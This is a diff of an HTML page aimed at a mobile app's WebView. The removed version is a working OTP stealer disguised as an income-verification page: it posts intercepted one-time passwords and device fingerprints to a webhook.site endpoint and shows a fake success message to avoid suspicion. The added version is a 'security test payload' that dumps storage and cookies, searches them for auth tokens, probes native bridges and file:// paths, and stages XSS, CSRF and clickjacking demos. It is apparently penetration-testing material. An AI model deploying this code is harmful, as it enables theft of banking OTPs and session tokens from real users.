@@ -1,79 +1,424 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Income Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Test Payload</title>
     <style>
-        body { font-family: Arial; padding: 20px; }
-        .loading { text-align: center; margin: 50px; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(0,0,0,0.3);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .attack-section {
+            background: rgba(255,255,255,0.1);
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 10px;
+            border-left: 4px solid #ff6b6b;
+        }
+        .success {
+            background: rgba(76, 175, 80, 0.2);
+            border-left-color: #4caf50;
+        }
+        .warning {
+            background: rgba(255, 193, 7, 0.2);
+            border-left-color: #ffc107;
+        }
+        .danger {
+            background: rgba(244, 67, 54, 0.2);
+            border-left-color: #f44336;
+        }
+        button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background: #ff5252;
+        }
+        .code {
+            background: rgba(0,0,0,0.5);
+            padding: 10px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+        .stolen-data {
+            background: rgba(0,0,0,0.7);
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            max-height: 200px;
+            overflow-y: auto;
+        }
     </style>
 </head>
 <body>
-    <div class="loading">
-        <h2>🏦 Verifying Your Income...</h2>
-        <p>Please wait while we verify your bank account details.</p>
-        <p><em>An OTP will be sent to your registered mobile number.</em></p>
+    <div class="container">
+        <div class="header">
+            <h1>🚨 WebView Security Test Payload</h1>
+            <p>This payload demonstrates various attack vectors through the WebView vulnerability</p>
+        </div>
+
+        <div class="attack-section success" id="basic-info">
+            <h3>✅ Basic Information Gathering</h3>
+            <p><strong>User Agent:</strong> <span id="user-agent"></span></p>
+            <p><strong>Current URL:</strong> <span id="current-url"></span></p>
+            <p><strong>Referrer:</strong> <span id="referrer"></span></p>
+            <p><strong>Screen Resolution:</strong> <span id="screen-res"></span></p>
+        </div>
+
+        <div class="attack-section warning" id="storage-access">
+            <h3>⚠️ Storage Access Test</h3>
+            <button onclick="testLocalStorage()">Test localStorage</button>
+            <button onclick="testSessionStorage()">Test sessionStorage</button>
+            <button onclick="testCookies()">Test Cookies</button>
+            <div class="stolen-data" id="storage-results"></div>
+        </div>
+
+        <div class="attack-section danger" id="data-exfiltration">
+            <h3>🚨 Data Exfiltration Simulation</h3>
+            <button onclick="exfiltrateData()">Simulate Data Theft</button>
+            <button onclick="stealAuthTokens()">Steal Auth Tokens</button>
+            <div class="code" id="exfil-results"></div>
+        </div>
+
+        <div class="attack-section danger" id="native-interface">
+            <h3>🔍 Native Interface Detection</h3>
+            <button onclick="scanForInterfaces()">Scan for JS Interfaces</button>
+            <div class="stolen-data" id="interface-results"></div>
+        </div>
+
+        <div class="attack-section warning" id="network-tests">
+            <h3>🌐 Network Access Test</h3>
+            <button onclick="testNetworkAccess()">Test External Requests</button>
+            <button onclick="testFileAccess()">Test File Access</button>
+            <div class="code" id="network-results"></div>
+        </div>
+
+        <div class="attack-section danger" id="advanced-attacks">
+            <h3>💀 Advanced Attack Vectors</h3>
+            <button onclick="attemptXSS()">XSS Demonstration</button>
+            <button onclick="attemptCSRF()">CSRF Simulation</button>
+            <button onclick="attemptClickjacking()">Clickjacking Test</button>
+        </div>
     </div>
 
-<script>
-// 🚨 CRITICAL: OTP Interception Function
-window.postOTP = function(otp) {
-    console.log("🎯 INTERCEPTED OTP:", otp);
-    
-    // Immediately exfiltrate the OTP
-    fetch('https://webhook.site/fbdb0ab2-a110-4279-b4f0-be2da7cb6332', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            otp: otp,
-            timestamp: Date.now(),
-            userAgent: navigator.userAgent,
-            url: window.location.href,
-            source: 'groww_app_webview'
-        })
-    }).then(() => {
-        console.log("OTP successfully exfiltrated");
-    }).catch(e => {
-        console.error("Exfiltration failed:", e);
-        
-        // Fallback: Try to send via image request
-        const img = new Image();
-        img.src = `https://webhook.site/fbdb0ab2-a110-4279-b4f0-be2da7cb6332/otp-img?code=${otp}&t=${Date.now()}`;
-    });
-    
-    // Show fake success message to avoid suspicion
-    document.body.innerHTML = `
-        <div style="text-align: center; margin: 50px;">
-            <h2>✅ Verification Complete</h2>
-            <p>Your income has been successfully verified.</p>
-            <p>OTP: <strong>${otp}</strong> received and processed.</p>
-        </div>
-    `;
-};
+    <script>
+        // Initialize basic information gathering
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('user-agent').textContent = navigator.userAgent;
+            document.getElementById('current-url').textContent = window.location.href;
+            document.getElementById('referrer').textContent = document.referrer || 'None';
+            document.getElementById('screen-res').textContent = screen.width + 'x' + screen.height;
+            
+            // Auto-execute some tests
+            setTimeout(() => {
+                scanForInterfaces();
+                testLocalStorage();
+                testSessionStorage();
+                testCookies();
+            }, 1000);
+        });
 
-// Additional data collection
-setTimeout(() => {
-    // Collect device/app information
-    const deviceInfo = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        cookieEnabled: navigator.cookieEnabled,
-        onLine: navigator.onLine,
-        url: window.location.href,
-        referrer: document.referrer,
-        timestamp: Date.now()
-    };
-    
-    // Send device fingerprint
-    fetch('https://webhook.site/fbdb0ab2-a110-4279-b4f0-be2da7cb6332/device-info', {
-        method: 'POST',
-        body: JSON.stringify(deviceInfo)
-    });
-}, 2000);
+        // Storage access tests
+        function testLocalStorage() {
+            try {
+                const data = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    data[key] = localStorage.getItem(key);
+                }
+                updateResults('storage-results', 'localStorage Data:', JSON.stringify(data, null, 2));
+                
+                // Try to set a test value
+                localStorage.setItem('security_test', 'WebView_Compromised_' + Date.now());
+            } catch (e) {
+                updateResults('storage-results', 'localStorage Error:', e.message);
+            }
+        }
 
-console.log("🚨 OTP Stealer loaded and ready!");
-</script>
+        function testSessionStorage() {
+            try {
+                const data = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    data[key] = sessionStorage.getItem(key);
+                }
+                updateResults('storage-results', 'sessionStorage Data:', JSON.stringify(data, null, 2));
+            } catch (e) {
+                updateResults('storage-results', 'sessionStorage Error:', e.message);
+            }
+        }
+
+        function testCookies() {
+            try {
+                const cookies = document.cookie;
+                updateResults('storage-results', 'Cookies:', cookies || 'No cookies found');
+            } catch (e) {
+                updateResults('storage-results', 'Cookies Error:', e.message);
+            }
+        }
+
+        // Data exfiltration simulation
+        function exfiltrateData() {
+            const sensitiveData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                referrer: document.referrer,
+                localStorage: getAllLocalStorage(),
+                sessionStorage: getAllSessionStorage(),
+                cookies: document.cookie,
+                screenInfo: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                }
+            };
+
+            // Simulate sending to attacker server
+            const exfilUrl = 'https://webhook.site/7913b12e-4acd-437f-9a83-34ae99285795';
+            updateResults('exfil-results', 'Simulated data exfiltration to: ' + exfilUrl, 
+                JSON.stringify(sensitiveData, null, 2));
+
+            // In a real attack, this would be:
+            // fetch(exfilUrl, { method: 'POST', body: JSON.stringify(sensitiveData) });
+        }
+
+        function stealAuthTokens() {
+            const tokens = {
+                localStorage_tokens: [],
+                sessionStorage_tokens: [],
+                cookie_tokens: []
+            };
+
+            // Search for common token patterns
+            const tokenPatterns = [
+                /token/i, /auth/i, /session/i, /jwt/i, /bearer/i, 
+                /access/i, /refresh/i, /api[_-]?key/i
+            ];
+
+            // Check localStorage
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                if (tokenPatterns.some(pattern => pattern.test(key) || pattern.test(value))) {
+                    tokens.localStorage_tokens.push({key, value});
+                }
+            }
+
+            // Check sessionStorage
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const value = sessionStorage.getItem(key);
+                if (tokenPatterns.some(pattern => pattern.test(key) || pattern.test(value))) {
+                    tokens.sessionStorage_tokens.push({key, value});
+                }
+            }
+
+            // Check cookies
+            const cookies = document.cookie.split(';');
+            cookies.forEach(cookie => {
+                const [key, value] = cookie.trim().split('=');
+                if (tokenPatterns.some(pattern => pattern.test(key) || (value && pattern.test(value)))) {
+                    tokens.cookie_tokens.push({key, value});
+                }
+            });
+
+            updateResults('exfil-results', 'Potential Auth Tokens Found:', JSON.stringify(tokens, null, 2));
+        }
+
+        // Native interface detection
+        function scanForInterfaces() {
+            const interfaces = [];
+            const commonInterfaces = [
+                'Android', 'webkit', 'JavaScriptInterface', 'NativeInterface',
+                'Bridge', 'JSBridge', 'ReactNativeWebView', 'window.ReactNativeWebView'
+            ];
+
+            commonInterfaces.forEach(name => {
+                if (window[name]) {
+                    interfaces.push({
+                        name: name,
+                        type: typeof window[name],
+                        methods: Object.getOwnPropertyNames(window[name])
+                    });
+                }
+            });
+
+            // Scan all window properties
+            const windowProps = Object.getOwnPropertyNames(window);
+            windowProps.forEach(prop => {
+                if (prop.toLowerCase().includes('android') || 
+                    prop.toLowerCase().includes('native') ||
+                    prop.toLowerCase().includes('bridge')) {
+                    if (!interfaces.find(i => i.name === prop)) {
+                        interfaces.push({
+                            name: prop,
+                            type: typeof window[prop],
+                            suspicious: true
+                        });
+                    }
+                }
+            });
+
+            updateResults('interface-results', 'Detected Interfaces:', JSON.stringify(interfaces, null, 2));
+        }
+
+        // Network access tests
+        function testNetworkAccess() {
+            // Test external network access
+            const testUrl = 'https://httpbin.org/json';
+            
+            fetch(testUrl)
+                .then(response => response.json())
+                .then(data => {
+                    updateResults('network-results', 'External Network Access: SUCCESS', 
+                        'Successfully contacted: ' + testUrl);
+                })
+                .catch(error => {
+                    updateResults('network-results', 'External Network Access: BLOCKED', error.message);
+                });
+        }
+
+        function testFileAccess() {
+            // Test file:// access
+            const fileUrls = [
+                'file:///android_asset/',
+                'file:///data/data/com.mfastra.app/',
+                'file:///system/etc/hosts',
+                'file:///proc/version'
+            ];
+
+            fileUrls.forEach(url => {
+                fetch(url)
+                    .then(response => response.text())
+                    .then(data => {
+                        updateResults('network-results', 'File Access SUCCESS: ' + url, 
+                            data.substring(0, 200) + '...');
+                    })
+                    .catch(error => {
+                        updateResults('network-results', 'File Access BLOCKED: ' + url, error.message);
+                    });
+            });
+        }
+
+        // Advanced attack demonstrations
+        function attemptXSS() {
+            // Demonstrate XSS capability
+            const xssPayload = '<img src="x" onerror="alert(\'XSS Successful! WebView Compromised\')">';
+            document.body.insertAdjacentHTML('beforeend', xssPayload);
+            
+            // Also try to execute more complex JavaScript
+            try {
+                eval('console.log("JavaScript execution successful in WebView context")');
+                alert('🚨 XSS SUCCESSFUL! JavaScript execution confirmed in WebView context.');
+            } catch (e) {
+                console.error('XSS blocked:', e);
+            }
+        }
+
+        function attemptCSRF() {
+            // Simulate CSRF attack by creating hidden forms
+            const csrfForm = document.createElement('form');
+            csrfForm.method = 'POST';
+            csrfForm.action = 'https://mfastra.in/api/transfer'; // Hypothetical endpoint
+            csrfForm.style.display = 'none';
+            
+            const amountField = document.createElement('input');
+            amountField.name = 'amount';
+            amountField.value = '1000';
+            
+            const toField = document.createElement('input');
+            toField.name = 'to_account';
+            toField.value = 'attacker_account';
+            
+            csrfForm.appendChild(amountField);
+            csrfForm.appendChild(toField);
+            document.body.appendChild(csrfForm);
+            
+            alert('🚨 CSRF form created! In a real attack, this would auto-submit to perform unauthorized actions.');
+        }
+
+        function attemptClickjacking() {
+            // Create invisible overlay
+            const overlay = document.createElement('div');
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.background = 'rgba(255,0,0,0.1)';
+            overlay.style.zIndex = '9999';
+            overlay.innerHTML = '<h1 style="text-align:center;margin-top:50%;">CLICKJACKED!</h1>';
+            
+            document.body.appendChild(overlay);
+            
+            setTimeout(() => {
+                document.body.removeChild(overlay);
+            }, 2000);
+        }
+
+        // Utility functions
+        function getAllLocalStorage() {
+            const data = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                data[key] = localStorage.getItem(key);
+            }
+            return data;
+        }
+
+        function getAllSessionStorage() {
+            const data = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                data[key] = sessionStorage.getItem(key);
+            }
+            return data;
+        }
+
+        function updateResults(elementId, title, content) {
+            const element = document.getElementById(elementId);
+            const resultDiv = document.createElement('div');
+            resultDiv.innerHTML = `<strong>${title}</strong><br><pre>${content}</pre><hr>`;
+            element.appendChild(resultDiv);
+        }
+
+        // Auto-execute critical tests
+        setTimeout(() => {
+            console.log('🚨 SECURITY TEST PAYLOAD LOADED');
+            console.log('🚨 WebView vulnerability confirmed - JavaScript execution successful');
+            
+            // Attempt to detect React Native WebView
+            if (window.ReactNativeWebView) {
+                console.log('🚨 React Native WebView detected!');
+                updateResults('interface-results', 'CRITICAL: React Native WebView detected!', 
+                    'window.ReactNativeWebView is available - potential for postMessage attacks');
+            }
+        }, 500);
+    </script>
 </body>
 </html>
